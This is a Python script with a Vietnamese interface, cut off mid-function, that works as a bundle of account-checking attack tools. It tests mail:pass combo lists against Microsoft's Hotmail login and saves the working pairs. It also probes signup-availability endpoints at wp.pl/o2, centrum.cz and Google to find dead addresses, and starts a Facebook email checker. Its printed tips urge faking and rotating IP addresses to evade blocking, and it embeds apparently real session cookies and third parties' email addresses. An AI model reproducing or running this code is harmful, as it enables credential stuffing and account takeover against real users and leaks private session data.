import requests,re
import os,sys
import time
import concurrent.futures
from requests import session
from colorama import Fore, Style
def clear():
        if os.name=='nt':os.system('cls')
        else:os.system('clear')
def o2pl():
        logopl="""\033[1;37m
                  ╔═╗╔═╗╦  ╔═╗╔╗╔  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                  ╠═╝║ ║║  ╠═╣║║║  ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
                  ╩  ╚═╝╩═╝╩ ╩╝╚╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═\n"""
        for x in logopl:sys.stdout.write(x);sys.stdout.flush();time.sleep(0.001)
        print("Hỗ Trợ Định Dạng Mail:Pass\n")
        try:
                nhap_file=input("\033[1;33mNhập File Chứa Email: ")
                luu_file=input("\033[1;32mNhập File Lưu Email Die: ")
        except:
                print("\033[1;31mKhông Tìm Thấy File!")
                quit()
        mo_file=open(nhap_file,"r").readlines()
        list_o2=[]
        for i in mo_file:
                mail=i.strip("\n")
                email=mail.split(':')[0]
                list_o2.append(email)
        def run(email):
                json_data = {
                'birthDate': '',
                'email': email,
                'lastName': '',
                'name': '',
                }
                headers = {
                'authority': '1login.wp.pl',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json;charset=utf-8',
                'cookie': 'statid=e962128ad34688aceb855c19160e3aff:873e8a:1666788132:v3; WPdp=djqH0g2MzpTXhFTBwFTXlhdRgkCFAMVRlBTP1tdVkZCSF5dUUZHSF1dXEZISFtBOUhdRgcDRlBDSEgcEEhLV0ZTEBlTXltHU1lEVFpJXFlFUF8MSEglNEhLH0gSD0hLVkZTBxkBDQ5TXkgqVTdTSEgcFkhLVkZTCR5TXlldRh4CRlBAUl1CUVpBXFJCUF5EGUZTMzo8RlAKRgkaRlBDSEgSFxoYAEhLRjFASFhdV0ZFSF9dUkZGSFJdXUZAVDdTSEgcFkhLVkZTCR5TXlldRh4CRlBAUl1CUVpBXFJCUF5ESEgEBUhLVRcM; WPtcs2=CPleQcAPleQcABIACCPLCyCgAP_AAH_AAB5YJNNd_H__bW9r-f5_aft0eY1P9_rz7uQzDhfNk-4F3L_W_LwX52E7NF36tq4KmR4ku1LBIUNlHNHUDUmwaokVryHsak2cpTNKJ7BEknMZOydYGF9vmxtj-QKY5v5_d3bx2D-t_9v-39z3z81Xn3d5_-_02PCdV5_9Dfn9fR_b89KP9_78v4v8_____3_e__3_7997_H8EmwCTDVuIAuxLHAm0DCKBECMKwkIoFABBQDC0QEADg4KdlYBPrCBAAgFAEYEQIcAUYEAgAAAgCQiACQIsEAAAIgEAAIAEAiEABAwCCgAsDAIAAQDQMUQoABAkAMiAiKUwICIEggJbKhBKC6Q0wgCrLACgERsFAAiAAAVgACAsHAMESAlYsECTFG-QAjBCgFEqFagk9NAA.YAAAAAAAAAAA; tpluid=3615708061775715700003; pubmaticuid=941DD036-98BE-452E-8499-76186C6ED927; STac=ac%3Ae962128ad34688aceb855c19160e3aff:1673500888:v1; ACac2=eJwyNDM3NjUwsDSxqAEEAAD//w24Aog=; WPabs=54b18b; rubiconuid=L6UG2JXH-M-4RUV; ixuid=Yvn0kYYtGU5dSVbl4mv.kAAA&4765; openxmiud=64f119b3-9e05-4507-ac8a-8793417b648c; AUTH_CSRF_104d4adcd8f124c1=MTY3MzUwMDg5Mnx2QUhER1g3a3hPS0tWaDlvQU15RzkzLVFvbjU2bXBNSUJ1bGpuclBhcDRGei1JVk9mcnUyWnV2aFQ1cHV3Y3R1MWVCWkNQUlp8S6HAQOZsWKlcUd518R8_E08JVyuCH_mvhG1jFYav428=; AUTH_CSRF_104d4adf4f6a9fde=MTY3MzUwMDg5NXxKVjh3cGhXdkN2UW1LWndWUzJzZVNyckJLNjhSdnh3REpib24xZWVJTjVCeVNXOUdEVmtfU2FjRFoyWWpFN2Q4bXRPeE1UbWV8Cu93UcKuYDjUkefoHgpOQQLDQb0oIbTSXGrhTwrsRKs=; apnxuid=4768354384671984804; smartmiud=4745579592714038851; adfmuid=2278319693473096817; PWA_adbd=0; BDh=qlYyMjAyNjBUsqpWMjM1TExMMlGyMtRRSkuySDVINFOyMqytBQAAAP//AQAA//8=; BDhs=qlYyMjAyNjBUsqpWsjA2VrIy1FGyNFSyMqzVgcoYGmHK1QIAAAD//wEAAP//; STpage=onelogin:https%3A%2F%2F1login.wp.pl%2Fzaloguj%3Fclient_id%3Do2_o2_pl%26login_challenge%3DCjwKJDEwNGQ0YWRmNGY2YTlmZGU5MDZkYzhiZGZhZjM0ZmEzZDc4ZhDvzf6dBhoOCghvMl9vMl9wbBICdjESIDeMWp4pYPO7nIaufUk-i_lUqKEhjMtSwJ9gc4wgLfNU:1673500902:f3ecb0456244e754a8cd:v1; STvisit=62bb1d0e12c4dcc6301069e149d0a917:9032a0:1673500814:1673500902:6::::2:2:v2',
                'device-memory': '2',
                'downlink': '3.4',
                'dpr': '1',
                'ect': '4g',
                'origin': 'https://1login.wp.pl',
                'referer': 'https://1login.wp.pl/rejestracja?login_challenge=CjwKJDEwNGQ0YWRmNGY2YTlmZGU5MDZkYzhiZGZhZjM0ZmEzZDc4ZhDvzf6dBhoOCghvMl9vMl9wbBICdjESIDeMWp4pYPO7nIaufUk-i_lUqKEhjMtSwJ9gc4wgLfNU&registrationFlow=new&registrationBrand=o2',
                'rtt': '150',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"32"',
                'sec-ch-ua-full-version-list': '"Not?A_Brand";v="8.0.0.0", "Chromium";v="108.0.5359.126", "Google Chrome";v="108.0.5359.126"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"0.1.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                'viewport-width': '811',
                }
                params = {
                'login_challenge': 'CjwKJDEwNGQ0YWRmNGY2YTlmZGU5MDZkYzhiZGZhZjM0ZmEzZDc4ZhDvzf6dBhoOCghvMl9vMl9wbBICdjESIDeMWp4pYPO7nIaufUk-i_lUqKEhjMtSwJ9gc4wgLfNU',
                }
                url='https://1login.wp.pl/api/v1/public/ol-identity-provider/register/available'
                res=requests.post(url,json=json_data,headers=headers,params=params)
                if '"available":true' in res.text:
                        print("\033[1;32mDIE =>>",email)
                        open(luu_file,"a").write(email+"\n")
                elif '"available":false' in res.text:
                        print("\033[1;31mLIVE =>>",email)
                else:
                        print("\033[1;33mLỖI =>>",email)
        with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(run, list_o2)
        chon=input("\033[1;37mBạn Có Muốn Quay Lại Menu Không? Y/n: ")
        if chon == 'Y':
                clear()
                help()
        elif chon == 'y':
                clear()
                help()
        else:
                clear()
                quit()


def passhot():
        ip = requests.get('http://ip-api.com/json/').json()
        getip=ip['query']
        getloc=ip['country']
        prx="\033[1;37m["+getip+"] "
        logohot="""\033[1;37m
                 ╦ ╦╔═╗╔╦╗╔╦╗╔═╗╦╦    ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                 ╠═╣║ ║ ║ ║║║╠═╣║║    ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
                 ╩ ╩╚═╝ ╩ ╩ ╩╩ ╩╩╩═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═\n"""
        for kl in logohot:sys.stdout.write(kl);sys.stdout.flush();time.sleep(0.001)
        print("\033[1;33mĐịnh Dạng Mail:Pass Nha Mấy Sư Huynh, Sư Tỷ")
        print("\033[1;33mVì Không Add Proxy Nên 1 IP Lọc Tầm 350 Con Nha")
        print("\033[1;33mIP Của Mấy Sư Huynh Sư Tỷ Là: "+"\033[1;35m"+getip)
        print("\033[1;33mQuốc Gia: "+"\033[1;35m"+getloc+"\n")
        try:
                nhap_file=input("\033[1;33mNhập File Chứa Email: ")
                file_luu=input("\033[1;36mNhập File Chứ Email Đúng Pass: ")
        except:
                print("\033[1;31mKhông Tìm Thấy File!")
                quit()
        mo_file=open(nhap_file,"r").read().splitlines()
        for i in mo_file:
                username=i.split(':')[0]
                password=i.split(':')[1]
                full=username+':'+password
                data=f'i13=0&login={username}&loginfmt={username}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DSRbNbydhCQI7UBYYn7sgzEKr9lJ91WRB4hdSkLQ*%21ovnlHdQPsV1QQ27Dvc%21TKclcun1NBSi*CnP9EZdVXKlAOAAUH61HNhhJwIIb50BpjPtEZ2SV5mo9XCZBBgDa5r9Hs6C3qa5SBKjquqphWM76hLTXgH4CCIMIBi4g5oITnjX01%21O9OE8CA87pkIyREKH1Oc6gV9v3NMrFWuN1b*1LPMdZDj9WkNrmD*XqYrixkF3HL%21bKdZyvT7Wa3HtoWA6Di7OVFk0znk9kzhFGGeOnc%24&PPSX=Passpo&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=109148'
                headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'vi,vi-VN;q=0.9',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'mkt=vi-VN; MUID=0859B1B5057167623C40A11304176613; IgnoreCAW=1; MSFPC=GUID=14db3f842f794eae90bca52c8bfe44fd&HASH=14db&LV=202111&V=4&LU=1636029899129; omkt=vi-VN; MSCC=1658482893; NAP=V=1.9&E=1b70&C=n7XZkm1y-5bLzdS_CN_kcygrC5pXMOjvFTufi1uZHHxJ1cbluMdvNQ&W=2; ANON=A=7A4ADFDC056D516CCDBA1D98FFFFFFFF&E=1bca&W=1a; MSCC=27.76.84.33-VN; MSPBack=0; SDIDC=CXJ8S1cCVyP8nDdnsjB6b2IvDJG6Gv!qOMD28RSMO2jiJ8voGGf8FsIbwl7mqyfPsTCCz6Yshs5S0t0t6TqAy8R75zAesGHwGdTi5mnrJPvBvpDo0qjhOtQcB4kdKSOyyCvfQxN7JTfx15Bu56LzSbnlePdsHGsBl2YObsXdHiTzoqdqeWjx1TOX1yu2IsxZK3ZkE3LJco3viWFH6Ny*rv!6uvjorWPR6lkh0TH0vHnNGWGio6jPfahdyHw!axb*XclMAVJ8nhekF2BGtrBMih*DNmNki!nd0d8A9wCv7AzaIkxgCTwMPMnVXq5l663Y4erbc7F7VwAAHw!T6V3A5LtIeoxM!YT90ptPexPltzoNCHQ4TNZHikEAybFvQQqUx6AFNkuLvP3HkX9SATyNf6oRCKt!LJq*SYY!IaEjy114Ypp2GIuahWfdDqAQTn95i8wowTcmWOZiY68*qHxkah1W9oAiob3rjQEnS!zbaNt0KokmZH7KYo5MKuZm4QHQ*Q$$; MSPPre=lutherlokiant%40hotmail.com%7c687502c799fc1e5c%7c%7c; MSPCID=687502c799fc1e5c; JSHP=3$gubinytmesserhch%40hotmail.com$gubin$messer$$2$0$0$8702015853912225$0:tamaranelliesm%40hotmail.com$Tamara$Nellie$$2$0$0$11518232216403230720$0:kconynha%40hotmail.com$tr%c3%a2ng$phong$$2$0$0$8665848071110348517$0; MSPSoftVis=@:@; mkt1=vi-VN; amsc=AtiAkpAwc5ZtErmjTXsjtJfg4z48pVZV3lHYbvY6a21p3IMK3WvdF4zYw1zGrz4LwbOSvwObCADH8ZGqm7nXDCIwpa6rjofbxLMeCjD4nE6SGtzdZ/Pb+FEy1/KMLd4qxO/tLZk/Xgkd+I8eFWU9M1MhV46BDYSuE3b24TN+9WEjon07WzekCmhk0aWoPc000wZQ4FuMDNeNBOsQHBLXgJkMx+U3j/aZpiJUle2ycNcnBOJ8L8d9V16h0i0lv6uU:2:3c; __Host-MSAAUTH=; __Host-MSAAUTHP=; logonLatency=LGN01=638100785229924599; uaid=010023fd551245109b6237fa20f21aac; MSPRequ=id=292841&lt=1674481771&co=0; OParams=11O.DdPOGCE3ERQx6FIQnwivMpgSTLsRQUfrIhtM6EvYBTvWe4NF!mAj2I3NG2UXuV5WxiSXR9jkt01OC1esC0hfX4wKcA1tAGFZvxSORVVdj1toYnMCcZgzxHRduDBE6a3AOTR5s03AvxFcc4b0b8w0S5jtuAJxcJmC0HF1QgtRrv*v3RVg7QhmGqvKawGe4Nr7keDRmj3WAwfBZmG1sjeiVysp6UjWRDG3vjM69epJOepRU0AuaXZhfwOFmm!JrqJC4KFQQ8VrejQD2l5*nF!sjBONEyESfW!QB5!NNs7lME3cB6*njEk6LQ51UINyMjiFUc745pjrybQFAf2dlVOZ9aWoekFHTqZitsKFAqih66WVzelwQwpR1AkUUCbqMDzvvFI8fZhhtOzjlVA6GdCzQ3E6eDG!*zp3wnFuffbP99liro4ZSAgCDriWpRnYSYczszgz3qus!WObXbLyWCuijfD3eTf7IzORR1jULnHMmg!DZ**1rfB63l7DtpD9qo7UrMLRYztxRAwzthNeWmUWKVkc2xgRrVh6Ln2lj85ilSey; MSPOK=$uuid-b9328669-4421-425d-9c4e-64301fcade77$uuid-b8a50cf9-b908-4575-9222-ed60a160fe81$uuid-dc56724b-8c99-4339-9e58-8da1b6144232; wlidperf=FR=L&ST=1674481667886',
                'Origin': 'https://login.live.com',
                'Referer': 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1674481722&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d89249c01-17ac-HAV7-02e9-aaa594a38258&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                }
                url='https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1674481722&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d89249c01-17ac-HAV7-02e9-aaa594a38258&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=C2F385635A95E5AE&bk=1674481726&uaid=08e4ec53f43e43249f38622bc4c1d15c&pid=0'
                res=requests.post(url,data=data,headers=headers)
                check=re.findall('Microsoft',res.text)
                if check == ['Microsoft','Microsoft','Microsoft']:
                        print(prx+"\033[1;32mSUCCESS:",full)
                        open(file_luu,"a").write(full+"\n")
                elif check == []:
                        print(prx+"\033[1;32mSUCCESS:",full)
                        open(file_luu,"a").write(full+"\n")
                elif check == ['Microsoft', 'Microsoft', 'Microsoft', 'Microsoft', 'Microsoft']:
                        dk2=requests.post('https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&ct=1674481722&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d89249c01-17ac-HAV7-02e9-aaa594a38258&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=C2F385635A95E5AE&bk=1674481726&uaid=08e4ec53f43e43249f38622bc4c1d15c&pid=0',headers=headers,data=data)
                        check2 = re.findall('Bạn',dk2.text)
                        if check2 == []:
                                print(prx+"\033[1;31mWRONG PASSWORD:",full)
                        else:
                                print(prx+"\033[1;33mERROR:",full)
                else:
                        print(prx+"\033[1;33mERROR:",full)
        chon=input("\033[1;37mBạn Có Muốn Quay Lại Menu Không? Y/n: ")
        if chon == 'Y':
                clear()
                help()
        elif chon == 'y':
                clear()
                help()
        else:
                clear()
                quit()

def centrum():
        logotrum="""\033[1;37m
                ╔═╗╔═╗╔╗╔╔╦╗╦═╗╦ ╦╔╦╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                ║  ║╣ ║║║ ║ ╠╦╝║ ║║║║  ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
                ╚═╝╚═╝╝╚╝ ╩ ╩╚═╚═╝╩ ╩  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═\n"""
        for ct in logotrum:sys.stdout.write(ct);sys.stdout.flush();time.sleep(0.001)
        print("Hỗ Trợ Định Dạng Mail:Pass\n")
        try:
                nhap_file=input("\033[1;33mNhập File Chứa Email: ")
                luu_email=input("\033[1;94mNhập File Lưu Email Die: ")
        except:
                print("\033[1;31mKhông Tìm Thấy File!")
                quit()
        mo_file=open(nhap_file,"r").readlines()
        listctr=[]
        for i in mo_file:
                mail=i.strip("\n")
                email=mail.split(':')[0]
                user=email.split('@')[0]
                listctr.append(user)
        def run(user):
                data={
                'op': 'checkuser',
                'username': user,
                'domain': 'centrum.cz',
                'ticker': '1',
                }
                headers={
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Origin': 'https://reg.centrum.cz',
                'Referer': 'https://reg.centrum.cz/?utm_source=centrumHP&utm_medium=mailbox&utm_term=registrovat',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                }
                url='https://reg.centrum.cz/ajax.php'
                res=requests.post(url,data=data, headers=headers).json()
                check=res["status"]
                full=user+"@centrum.cz"
                if check == 0:
                        print("\033[1;31mLIVE =>>",full)
                else:
                        print("\033[1;32mDIE =>>",full)
                        open(luu_email,"a").write(full+"\n")
        with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(run, listctr)
        chon=input("\033[1;37mBạn Có Muốn Quay Lại Menu Không? Y/n: ")
        if chon == 'Y':
                clear()
                help()
        elif chon == 'y':
                clear()
                help()
        else:
                clear()
                quit()

def gmail():
        logogmail="""\033[1;37m
                ╔═╗╔╦╗╔═╗╦╦    ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                ║ ╦║║║╠═╣║║    ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
                ╚═╝╩ ╩╩ ╩╩╩═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═\n"""
        for vc in logogmail:sys.stdout.write(vc);sys.stdout.flush();time.sleep(0.001)

        try:
                print("Hỗ Trợ Định Dạng Mail:Pass\n")
                nhap_file=input("\033[1;33mNhập File Chứa Email: ")
                luu_email=input("\033[1;94mNhập File Lưu Email Die: ")
        except:
                print("\033[1;31mKhông Tìm Thấy File!")
                quit()
        mo_file=open(nhap_file,"r").read().splitlines()
        list_gmail=[]
        for i in mo_file:
                mail=i.strip("\n")
                email=i.split(':')[0]
                list_gmail.append(email)
        def run(email):
                data=f'flowEntry=SignUp&flowName=GlifWebSignIn&continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&f.req=%5B%22AEThLlxW8eNh7I717NFQgEJhhfS0ySiuzQJxzYc_22vnt8YllYT8g4EGkHpf0ZJJcp5mjKoldzI8VzX0YNVGVulzcGeFeE2YYYMB_mflSMSYLBtYiWGUjBI1_eprTOfxvzkTDmdpPPRrqAmlnOwR9QdBX2NGxninYT4OUJcGgTDvvLqtN6fo8SCMm90cQvkWVQN5kNVb_wCzHyrHOjIhSQVUB73B8RI9hw%22%2C%22%22%2C%22%22%2C%22{email.replace("@gmail.com","")}%22%2Ctrue%2C%22S1140864020%3A1670945489551602%22%2C1%5D&at=AFoagUW6UNV8lKuxebNs0SsIepiy670yiw%3A1670945489567&azt=AFoagUVtLLqRGj7U4bGqhDm30sJVEd1I5w%3A1670945489567&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22VN%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B5%2C%2277185425430.apps.googleusercontent.com%22%2C%5B%22https%3A%2F%2Fwww.google.com%2Faccounts%2FOAuthLogin%22%5D%2Cnull%2Cnull%2C%2291132a1d-0fb7-47b1-88c6-efe6f2983fda%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C5%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2Cnull%2Cfalse%2C1%2C%22%22%5D&gmscoreversion=undefined&'
                headers={
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'cookie': 'SOCS=CAISHAgCEhJnd3NfMjAyMjA5MjYtMF9SQzIaAnZpIAEaBgiA49iZBg; SEARCH_SAMESITE=CgQIiJcB; OTZ=6808754_28_28__28_; SID=Rgjt_cNy7lrlpaysYS_SblWtFHK8poW1mo6VJYa0OSV4R0xP1dOtBDROhKjz5SFZ2HPEAg.; __Secure-1PSID=Rgjt_cNy7lrlpaysYS_SblWtFHK8poW1mo6VJYa0OSV4R0xP6i9SRLJ2CfBQdtzAtQwGKw.; __Secure-3PSID=Rgjt_cNy7lrlpaysYS_SblWtFHK8poW1mo6VJYa0OSV4R0xPLecZ92MaIfSrGuMqMt58pA.; LSID=o.chat.google.com|o.mail.google.com|s.VN|s.youtube:Rgjt_QKOq4VvjZ-zeMOEMrnS2bJuYXMykeZ03pk5VTiBmCrS_GBxgp-6OrljgSEuhCTmpw.; __Host-1PLSID=o.chat.google.com|o.mail.google.com|s.VN|s.youtube:Rgjt_QKOq4VvjZ-zeMOEMrnS2bJuYXMykeZ03pk5VTiBmCrSh_tFjkFrpPLp8IwjEa20Fg.; __Host-3PLSID=o.chat.google.com|o.mail.google.com|s.VN|s.youtube:Rgjt_QKOq4VvjZ-zeMOEMrnS2bJuYXMykeZ03pk5VTiBmCrSwGQJGzGnctiYneQHj99LgQ.; HSID=AIUuPaTXOPxOkhMLf; SSID=Athev6z3ak8lEpjuF; APISID=8DlG_TO9ysaCYWTf/Ae-1aPHfAEn7sgv55; SAPISID=GedaQ3G9H4uxE2bs/A3OQFQ_hkv_E85cJ4; __Secure-1PAPISID=GedaQ3G9H4uxE2bs/A3OQFQ_hkv_E85cJ4; __Secure-3PAPISID=GedaQ3G9H4uxE2bs/A3OQFQ_hkv_E85cJ4; ACCOUNT_CHOOSER=AFx_qI5txOCPu91XTnxPNWCseBPchHwgbehh8VuGmeFk2zRINY0V738h-KLeP5Yo3lfvSiV5l-VtwLRgN5Op0w_XVG6YwqIPMLN-BEa6XvrEhrKkXR8gCYkKgdnPUidsjcpCI1GdsBAPbKTlcobj0M0qfH_I3VOANYPGKYf9_AEOU1nH7JXGgaLrtLC4auEVbAiLDXrOhUipqvcGttb7vTflj9NtvK68Ml-Sd47VtuV0Cil4fCv-0sA; AEC=AakniGP-meb0VviSuwR7IJjoArTEwhSbhpotg-le9KKmLAAOgktBblZi5w; NID=511=kPtbzrhed3UY0hf0TMdxpUWo0GtPwy36ZNTlZddiOq1gkQDBPCxh7VKs010hIkHQpo479bpBczkzqMG0H8A3MCw_zrQDLsz5slA7JO2Y12uOh0tEK2j7pLWpZQdtOSTmRo6rJQTeGz2OSKI3RCaBU-6hbKcj81RZ8Xq-ClVxC17Bza4kPouFYs0LsHEVHYIajoqlz4HtzfYHkqE6g_lbfFb16dB9SKlFE6CX7r1FymiUUwCXWLMPgBS-cBXiSBNwAc-T1qXI_iCfIToCMr-y-zxIi-w95fgeDB75V-MKPUHizSyKd2_yLMuYmA; 1P_JAR=2022-12-13-10; __Host-GAPS=1:RVsbsQmEhDoLUWva9ubWUjp1xqfen5umeSWt_tt3GEE_egqADJrD_E1hzlaB8ntwZbhkS4j5ZmamHWgB9u04UNJLaYQrXGExdkm6LHNWFo_WdZYEreZQ033j2EQggNdO6OLUV6X_rW5G0dpBsHryFVH_XhOTnQ:cbjgPCdoVlKJTgeQ; SIDCC=AIKkIs2HVbit189PhWNwtaOVx1w7KkuPvA9zMl9pwOAA9qBwPFutPfoy6NDWQj-BSmFhRXIGbg; __Secure-1PSIDCC=AIKkIs0b8W5dBEgFOgDFbtzs8eMcRhIppWPIfWr6OotDZ-9FNMngm-BupwRxFRzrjM4DOj4Et-0; __Secure-3PSIDCC=AIKkIs3y6FQcDoVUOoLByb8UDCXpUUC6LI0tiGBtnQpSskEzWcnMNNMf_O63FzSBDCAK-7qjc68',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp',
                'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=91132a1d-0fb7-47b1-88c6-efe6f2983fda,sync_account_id=111888066456390590950,signin_mode=all_accounts,signout_mode=show_confirmation',
                'x-client-data': 'CIu2yQEIpLbJAQjEtskBCKmdygEIq5PLAQiSocsBCIr5zAEI3fnMAQjA+swBCPD/zAEIh4HNAQiygs0BCL2DzQE=',
                'x-same-domain': '1',
                }
                params={
                'hl': 'vi',
                '_reqid': '62102',
                'rt': 'j',
                }
                url='https://accounts.google.com/_/signup/webusernameavailability'
                res=requests.post(url, data=data, headers=headers, params=params).text
                fix=res.replace(")]}'","").split('[[["gf.wuar",')[1].split(',[],')[0].split(']]]')[0].split(',[')[0].split(']]]')[0]
                if fix == "1":
                        print("\033[1;32mDIE =>>",email)
                elif fix == "2":
                        print("\033[1;31mLIVE =>>",email)
                else:
                        print("\033[1;33mLỖI =>>",email)
        with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(run, list_gmail)
        chon=input("\033[1;37mBạn Có Muốn Quay Lại Menu Không? Y/n: ")
        if chon == 'Y':
                clear()
                help()
        elif chon == 'y':
                clear()
                help()
        else:
                clear()
                quit()



def validfb():
  logo="""\033[1;37m
╦  ╦╔═╗╦  ╦╔╦╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
╚╗╔╝╠═╣║  ║ ║║  ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
 ╚╝ ╩ ╩╩═╝╩═╩╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═\n"""
  for v in logo:sys.stdout.write(v);sys.stdout.flush();time.sleep(0.001)
  try:
    print (" \033[1;93m LƯU Ý :")
    print ("   \033[1;93m•HỖ TRỢ ĐỊNH DẠNG MAIL|PASS")
    print ("   \033[1;93m•TOOL CHẠY ĐA LUỒNG ĐỒNG NGHĨA VỚI IP CỦA BẠN SẼ DỄ BỊ FB BLOCK HƠN")
    print ("   \033[1;93m•VUI LÒNG FAKE IP TRƯỚC CHẠY TOOL NÀY")
    print ("   \033[1;93m•MỖI IP CHECK ĐƯỢC 50-80 MAIL RỒI ĐỔI IP KHÁC")
    fileEmail = open(input(" \033[1;36mNhập File Chứa Email(ex: mail.txt) : ")).readlines()
    valid = input(" \033[1;34mNhập File Lưu Email Valid Facebook(ex: validfb.txt) : ")
  except:
    print (" \033[1;31mKHÔNG TÌM THẤY FILE BẠN ĐÃ NHẬP !")
    quit()



  list_email_fb = []
  for line_email_fb in fileEmail:
    email_fb1 = line_email_fb.strip("\n")
    email_fb = email_fb1.split(':')[0]

    list_email_fb.append(email_fb)
  link1='https://m.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0'
  h1={
